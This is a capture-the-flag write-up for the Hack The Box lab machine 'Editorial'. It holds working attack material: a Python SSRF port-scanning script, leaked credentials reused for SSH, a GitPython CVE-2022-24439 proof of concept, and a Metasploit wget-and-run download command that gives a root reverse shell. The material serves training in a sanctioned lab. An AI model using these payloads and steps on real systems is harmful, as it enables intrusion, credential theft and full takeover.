---
title: "HTB Machine Editorial"
date: 2024-06-16T05:12:20-04:00
tags:
  - htb
  - machine
  - linux
  - ssrf
  - port-scan
  - custom-web-app
  - xspa
  - internal-service
  - git
  - leak
  - secret
  - gitpython
  - cve-2022-24439
  - metasploit
---

# Editorial - [HTB](https://app.hackthebox.com/machines/Editorial)

![alt text](images/banner.png)

### Recon
Let's start off by Nmap'ing the target.
#### Nmap
```txt
# Nmap 7.94SVN scan initiated Tue Jun 18 07:58:25 2024 as: nmap -vvv -p 22,80 -sCV -oN nmap 10.129.49.40

Nmap scan report for editorial.htb (10.129.49.40)
Host is up, received conn-refused (0.37s latency).
Scanned at 2024-06-18 07:58:25 +02 for 27s

PORT STATE SERVICE REASON VERSION

22/tcp open ssh syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMApl7gtas1JLYVJ1BwP3Kpc6oXk6sp2JyCHM37ULGN+DRZ4kw2BBqO/yozkui+j1Yma1wnYsxv0oVYhjGeJavM=
| 256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMXtxiT4ZZTGZX4222Zer7f/kAWwdCWM/rGzRrGVZhYx

80/tcp open http syn-ack nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Editorial Tiempo Arriba
| http-methods:
|_ Supported Methods: OPTIONS HEAD GET

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Tue Jun 18 07:58:52 2024 -- 1 IP address (1 host up) scanned in 27.03 seconds
```

#### HTTP Service
![alt text](images/20240618081128.png)
The `http://editorial.htb/upload` looks interesting. There's a field name called `bookurl` which accepts an URL and tries to load the image when the `Preview` button is clicked. It sends the following request.
```text
POST /upload-cover HTTP/1.1
Host: editorial.htb
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------30720708513481866454123983682
Content-Length: 372
Origin: http://editorial.htb
Connection: close
Referer: http://editorial.hrb/upload
DNT: 1
Sec-GPC: 1 

-----------------------------30720708513481866454123983682
Content-Disposition: form-data; name="bookurl"

http://10.10.14.133:8000/aaa.jpeg
-----------------------------30720708513481866454123983682

Content-Disposition: form-data; name="bookfile"; filename=""
Content-Type: application/octet-stream

-----------------------------30720708513481866454123983682--
```

The above request sends a GET request to `http://10.10.14.133:8000/aaa.jpeg`.
```bash
$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.129.49.40 - - [18/Jun/2024 08:07:01] "GET /aaa.jpeg HTTP/1.1" 200 -
```

Looks like it's vulnerable to SSRF and we can read the data by visiting a temporary upload URL.
![alt text](images/20240618081046.png)

After this point, I tried to upload a shell but I couldn't execute code on the server. Also the temporary file was deleted between 1-2 minutes. So, I researched on SSRF and found an [article discussing internal port scanning using SSRF called **Cross-Site Port Attack**(XSPA)](https://cyberweapons.medium.com/internal-port-scanning-via-ssrf-eb248ae6fa7b).

Then, I tried Burp's intruder but the scan time was very slow in the community edition. Therefore, I wrote a custom python script to scan for ports and using the temporary file upload link we can grab the information about any possible hits.

```python
import requests

def discoverPorts(port):
    # URL to which the request will be sent
    url = 'http://editorial.htb/upload-cover'

    # Files to be uploaded
    files = {
        'bookfile': ('', b'', 'application/octet-stream')
    }

    # Form data
    data = {
        'bookurl': 'http://127.0.0.1:' + port
    }

    # Headers for the request
    headers = {
        'Host': 'editorial.htb',
        'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Origin': 'http://editorial.htb',
        'Connection': 'close',
        'Referer': 'http://editorial.htb/upload',
        'DNT': '1',
        'Sec-GPC': '1'
    }

    # Send the POST request with the files, form data, and headers
    response = requests.post(url, files=files, data=data, headers=headers)

    # Print the response from the server
    if response.text != '/static/images/unsplash_photo_1630734277837_ebe62757b6e0.jpeg':
        print("Found Something Interesting on Port: " + port)
        print(response.text)
        if response.text.startswith("static/uploads/"):
            print("Getting the Interesting File")
            url = 'http://editorial.htb/' + response.text
            print(url)
            res_secret = requests.get(url)
            if res_secret.status_code == 200:
                with open('intresting-file.txt','wb') as file:
                    file.write(res_secret.text.encode())
                return 1
    print("Nothing found on Port: " + port)
    return 0

def getEndpointData(endpoint):
    # URL to which the request will be sent
    url = 'http://editorial.htb/upload-cover'

    # Files to be uploaded
    files = {
        'bookfile': ('', b'', 'application/octet-stream')
    }

    # Form data
    data = {
        'bookurl': 'http://127.0.0.1:5000' + endpoint
    }

    # Headers for the request
    headers = {
        'Host': 'editorial.htb',
        'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Origin': 'http://editorial.htb',
        'Connection': 'close',
        'Referer': 'http://editorial.htb/upload',
        'DNT': '1',
        'Sec-GPC': '1'
    }

    # Send the POST request with the files, form data, and headers
    response = requests.post(url, files=files, data=data, headers=headers)

    # Print the response from the server
    if response.text != '/static/images/unsplash_photo_1630734277837_ebe62757b6e0.jpeg':
        print("Found Something Interesting on endpoint: " + endpoint)
        print(response.text)
        if response.text.startswith("static/uploads/"):
            print("Getting the Interesting File")
            url = 'http://editorial.htb/' + response.text
            print(url)
            res_secret = requests.get(url)
            if res_secret.status_code == 200:
                filename = endpoint.split('/')
                filename = filename[len(filename)-1]
                with open(filename,'wb') as file:
                    file.write(res_secret.text.encode())
                return 1
    print("Nothing found on URL: " + url)
    return 0

if __name__ == '__main__':
    for i in range(3000, 10000):
        stop_flag = discoverPorts(str(i))
        if stop_flag:
            break
    endpoints = ["/api/latest/metadata/messages/promos",
                 "/api/latest/metadata/messages/coupons",
                 "/api/latest/metadata/messages/authors",
                 "/api/latest/metadata/messages/how_to_use_platform",
                 "/api/latest/metadata/changelog",
                 "/api/latest/metadata"]
    
    for endpoint in endpoints:
        getEndpointData(endpoint)
    
```

The script is a proof of concept and not refactored well but it gets the job done.

I found a hit on port `5000` and the output looks like the following:
```json
{
    "messages": [
        {
            "promotions": {
                "description": "Retrieve a list of all the promotions in our library.",
                "endpoint": "/api/latest/metadata/messages/promos",
                "methods": "GET"
            }
        },
        {
            "coupons": {
                "description": "Retrieve the list of coupons to use in our library.",
                "endpoint": "/api/latest/metadata/messages/coupons",
                "methods": "GET"
            }
        },
        {
            "new_authors": {
                "description": "Retrieve the welcome message sended to our new authors.",
                "endpoint": "/api/latest/metadata/messages/authors",
                "methods": "GET"
            }
        },
        {
            "platform_use": {
                "description": "Retrieve examples of how to use the platform.",
                "endpoint": "/api/latest/metadata/messages/how_to_use_platform",
                "methods": "GET"
            }
        }
    ],
    "version": [
        {
            "changelog": {
                "description": "Retrieve a list of all the versions and updates of the api.",
                "endpoint": "/api/latest/metadata/changelog",
                "methods": "GET"
            }
        },
        {
            "latest": {
                "description": "Retrieve the last version of api.",
                "endpoint": "/api/latest/metadata",
                "methods": "GET"
            }
        }
    ]
}
```

It seems there's an internal API service running on port 5000. So I tried to get all the endpoints listed here. Out of these 6 endpoints 3 of them returned 200 and JSON data.

**authors**
```json
{
    "template_mail_message": "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, Editorial Tiempo Arriba Team."
}
```

**changelog**
```json
[
    {
        "1": {
            "api_route": "/api/v1/metadata/",
            "contact_email_1": "soporte@tiempoarriba.oc",
            "contact_email_2": "info@tiempoarriba.oc",
            "editorial": "Editorial El Tiempo Por Arriba"
        }
    },
    {
        "1.1": {
            "api_route": "/api/v1.1/metadata/",
            "contact_email_1": "soporte@tiempoarriba.oc",
            "contact_email_2": "info@tiempoarriba.oc",
            "editorial": "Ed Tiempo Arriba"
        }
    },
    {
        "1.2": {
            "contact_email_1": "soporte@tiempoarriba.oc",
            "contact_email_2": "info@tiempoarriba.oc",
            "editorial": "Editorial Tiempo Arriba",
            "endpoint": "/api/v1.2/metadata/"
        }
    },
    {
        "2": {
            "contact_email": "info@tiempoarriba.moc.oc",
            "editorial": "Editorial Tiempo Arriba",
            "endpoint": "/api/v2/metadata/"
        }
    }
]
```

**coupons**
```json
[
    {
        "2anniversaryTWOandFOURread4": {
            "contact_email_2": "info@tiempoarriba.oc",
            "valid_until": "12/02/2024"
        }
    },
    {
        "frEsh11bookS230": {
            "contact_email_2": "info@tiempoarriba.oc",
            "valid_until": "31/11/2023"
        }
    }
]
```


### Foothold
I used the credential from the authors to try to SSH into the box and it worked.
```text
dev:dev080217_devAPI!@
```

![alt text](images/20240618083237.png)

### Privilege Escalation
After, successfully getting `dev`'s SSH shell. Let's enumerate the target using LinPEAS.

```ad-tip
I found a vulnerable version of `screen v4.09.00` but the [exploit](https://www.exploit-db.com/exploits/51252) didn't work. To exploit this we needed the `screen` to have setuid bit set by root.
```

**Users that exist on the box.**
![alt text](images/20240618180158.png)

**Found a git initialized directory.**
![alt text](images/20240618174809.png)

After enumerating the `apps` folder with `git` I found some interesting commits.
```bash
$ git log
commit 8ad0f3187e2bda88bba85074635ea942974587e8 (HEAD -> master)
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 21:04:21 2023 -0500

    fix: bugfix in api port endpoint

commit dfef9f20e57d730b7d71967582035925d57ad883
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 21:01:11 2023 -0500

    change: remove debug and update api port

commit b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:55:08 2023 -0500

    change(api): downgrading prod to dev
    
    * To use development environment.

commit 1e84a036b2f33c59e2390730699a488c65643d28
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:51:10 2023 -0500

    feat: create api to editorial info
    
    * It (will) contains internal info about the editorial, this enable
       faster access to information.

commit 3251ec9e8ffdd9b938e83e3b9fbf5fd1efa9bbb8
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:48:43 2023 -0500

    feat: create editorial app
    
    * This contains the base of this project.
    * Also we add a feature to enable to external authors send us their
       books and validate a future post in our editorial.
```

The commit before `change(api): downgrading prod to dev` looks very interesting, It says `It (will) contains internal info about the editorial, this enable faster access to information.` Let's checkout the commit.
```bash
dev@editorial:~/apps$ git checkout 1e84a036b2f33c59e2390730699a488c65643d28
D	app_editorial/static/css/bootstrap-grid.css
D	app_editorial/static/css/bootstrap-grid.css.map
D	app_editorial/static/css/bootstrap-grid.min.css
D	app_editorial/static/css/bootstrap-grid.min.css.map
D	app_editorial/static/css/bootstrap-grid.rtl.css
D	app_editorial/static/css/bootstrap-grid.rtl.css.map
D	app_editorial/static/css/bootstrap-grid.rtl.min.css
D	app_editorial/static/css/bootstrap-grid.rtl.min.css.map
D	app_editorial/static/css/bootstrap-reboot.css
D	app_editorial/static/css/bootstrap-reboot.css.map
D	app_editorial/static/css/bootstrap-reboot.min.css
D	app_editorial/static/css/bootstrap-reboot.min.css.map
D	app_editorial/static/css/bootstrap-reboot.rtl.css
D	app_editorial/static/css/bootstrap-reboot.rtl.css.map
D	app_editorial/static/css/bootstrap-reboot.rtl.min.css
D	app_editorial/static/css/bootstrap-reboot.rtl.min.css.map
D	app_editorial/static/css/bootstrap-utilities.css
D	app_editorial/static/css/bootstrap-utilities.css.map
D	app_editorial/static/css/bootstrap-utilities.min.css
D	app_editorial/static/css/bootstrap-utilities.min.css.map
D	app_editorial/static/css/bootstrap-utilities.rtl.css
D	app_editorial/static/css/bootstrap-utilities.rtl.css.map
D	app_editorial/static/css/bootstrap-utilities.rtl.min.css
D	app_editorial/static/css/bootstrap-utilities.rtl.min.css.map
D	app_editorial/static/css/bootstrap.css
D	app_editorial/static/css/bootstrap.css.map
D	app_editorial/static/css/bootstrap.min.css
D	app_editorial/static/css/bootstrap.min.css.map
D	app_editorial/static/css/bootstrap.rtl.css
D	app_editorial/static/css/bootstrap.rtl.css.map
D	app_editorial/static/css/bootstrap.rtl.min.css
D	app_editorial/static/css/bootstrap.rtl.min.css.map
D	app_editorial/static/images/login-background.jpg
D	app_editorial/static/images/pexels-janko-ferlic-590493.jpg
D	app_editorial/static/images/pexels-min-an-694740.jpg
D	app_editorial/static/js/bootstrap.bundle.js
D	app_editorial/static/js/bootstrap.bundle.js.map
D	app_editorial/static/js/bootstrap.bundle.min.js
D	app_editorial/static/js/bootstrap.bundle.min.js.map
D	app_editorial/static/js/bootstrap.esm.js
D	app_editorial/static/js/bootstrap.esm.js.map
D	app_editorial/static/js/bootstrap.esm.min.js
D	app_editorial/static/js/bootstrap.esm.min.js.map
D	app_editorial/static/js/bootstrap.js
D	app_editorial/static/js/bootstrap.js.map
D	app_editorial/static/js/bootstrap.min.js
D	app_editorial/static/js/bootstrap.min.js.map
D	app_editorial/templates/about.html
D	app_editorial/templates/index.html
D	app_editorial/templates/upload.html
Note: switching to '1e84a036b2f33c59e2390730699a488c65643d28'.

You are in 'detached HEAD' state. You can look around, make experimental
changes and commit them, and you can discard any commits you make in this
state without impacting any branches by switching back to a branch.

If you want to create a new branch to retain commits you create, you may
do so (now or later) by using -c with the switch command. Example:

  git switch -c <new-branch-name>

Or undo this operation with:

  git switch -

Turn off this advice by setting config variable advice.detachedHead to false

HEAD is now at 1e84a03 feat: create api to editorial info
```

After, checking out that commit I found two folders `app_api` and `app_editorial`. The `app_api` was the app that leaked the credential for `dev` user and gave us foothold.  
```bash
dev@editorial:~/apps$ ls
app_api  app_editorial
dev@editorial:~/apps$ cd app_
-bash: cd: app_: No such file or directory
dev@editorial:~/apps$ cd app_api/
dev@editorial:~/apps/app_api$ ls
app.py
```

Let's see what's inside the `app.py` file.
```bash
dev@editorial:~/apps/app_api$ cat app.py 
# API (in development).
# * To retrieve info about editorial

import json
from flask import Flask, jsonify

# -------------------------------
# App configuration
# -------------------------------
app = Flask(__name__)

# -------------------------------
# Global Variables
# -------------------------------
api_route = "/api/latest/metadata"
api_editorial_name = "Editorial Tiempo Arriba"
api_editorial_email = "info@tiempoarriba.htb"

# -------------------------------
# API routes
# -------------------------------
# -- : home
@app.route('/api', methods=['GET'])
def index():
    data_editorial = {
        'version': [{
            '1': {
                'editorial': 'Editorial El Tiempo Por Arriba', 
                'contact_email_1': 'soporte@tiempoarriba.oc',
                'contact_email_2': 'info@tiempoarriba.oc',
                'api_route': '/api/v1/metadata/'
            }},
            {
            '1.1': {
                'editorial': 'Ed Tiempo Arriba', 
                'contact_email_1': 'soporte@tiempoarriba.oc',
                'contact_email_2': 'info@tiempoarriba.oc',
                'api_route': '/api/v1.1/metadata/'
            }},
            {
            '1.2': {
                'editorial': api_editorial_name, 
                'contact_email_1': 'soporte@tiempoarriba.oc',
                'contact_email_2': 'info@tiempoarriba.oc',
                'api_route': f'/api/v1.2/metadata/'
            }},
            {
            '2': {
                'editorial': api_editorial_name, 
                'contact_email': 'info@tiempoarriba.moc.oc',
                'api_route': f'/api/v2/metadata/'
            }},
            {
            '2.3': {
                'editorial': api_editorial_name, 
                'contact_email': api_editorial_email,
                'api_route': f'{api_route}/'
            }
        }]
    }
    return jsonify(data_editorial)

# -- : (development) mail message to new authors
@app.route(api_route + '/authors/message', methods=['GET'])
def api_mail_new_authors():
    return jsonify({
        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: prod\nPassword: 080217_Producti0n_2023!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
    }) # TODO: replace dev credentials when checks pass

# -------------------------------
# Start program
# -------------------------------
if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5001, debug=True)
```

Looks like the we credentials for `prod` user. Let's try to SSH into the box as `prod` with the following credential.
```text
prod:080217_Producti0n_2023!@
```

Successfully logged in as `prod`.
![alt text](images/20240618181004.png)

The user `prod` can run only the following script as sudo.
```bash
prod@editorial:~$ sudo -l
[sudo] password for prod: 
Matching Defaults entries for prod on editorial:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User prod may run the following commands on editorial:
    (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *
```

Let's see what the script looks like.
```bash
prod@editorial:~$ cat /opt/internal_apps/clone_changes/clone_prod_change.py
#!/usr/bin/python3

import os
import sys
from git import Repo

os.chdir('/opt/internal_apps/clone_changes')

url_to_clone = sys.argv[1]

r = Repo.init('', bare=True)
r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
```

The script is cloning a repository from a remote URL. And it's using a git library. Let's see which python package is that.
```bash
prod@editorial:~$ pip3 list | grep -i git
gitdb                 4.0.10
GitPython             3.1.29
```

[**CVE-2022-24439**](https://www.cve.org/CVERecord?id=CVE-2022-24439)
According to [SNYK](https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858): Affected versions( < 3.1.30) of `gitpython` package are vulnerable to Remote Code Execution (RCE) due to improper user input validation, which makes it possible to inject a maliciously crafted remote URL into the clone command. Exploiting this vulnerability is possible because the library makes external calls to `git` without sufficient sanitization of input arguments. This is only relevant when enabling the `ext` transport protocol.

**PoC:**
```python
from git import Repo
r = Repo.init('', bare=True)
r.clone_from('ext::sh -c touch% /tmp/pwned', 'tmp', multi_options=["-c protocol.ext.allow=always"])
```

We found our PE vector. To exploit it I used the `msfconsole`'s web delivery module and set payload to `linux/x64/shell/reverse_tcp`. And I uploaded the payload to the `prod` user's home directory.

Metasploit
```bash
msf6 exploit(multi/script/web_delivery) > 
[*] Started reverse TCP handler on 10.10.14.50:4444 
[*] Using URL: http://10.10.14.50:8080/DHmVwiq
[*] Server started.
[*] Run the following command on the target machine:
wget -qO kKqgpCZC --no-check-certificate http://10.10.14.50:8080/DHmVwiq; chmod +x kKqgpCZC; ./kKqgpCZC& disown
```

Executing the payload using the exploit:
```bash
prod@editorial:~$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c /home/prod/kKqgpCZC'
```

Metasploit:
```bash
[*] Run the following command on the target machine:
wget -qO kKqgpCZC --no-check-certificate http://10.10.14.50:8080/DHmVwiq; chmod +x kKqgpCZC; ./kKqgpCZC& disown
[*] 10.129.76.145    web_delivery - Delivering Payload (250 bytes)
[*] 10.129.76.146    web_delivery - Delivering Payload (250 bytes)
[*] Sending stage (38 bytes) to 10.129.76.146
[*] Command shell session 3 opened (10.10.14.50:4444 -> 10.129.76.146:34428) at 2024-06-18 18:33:50 +0200

msf6 exploit(multi/script/web_delivery) > sessions

Active sessions
===============

  Id  Name  Type             Information  Connection
  --  ----  ----             -----------  ----------
  3         shell x64/linux               10.10.14.50:4444 -> 10.129.76.146:34428 (
                                          10.129.76.146)

msf6 exploit(multi/script/web_delivery) > sessions -i 3
[*] Starting interaction with 3...

id
uid=0(root) gid=0(root) groups=0(root)
```

We successfully rooted the box.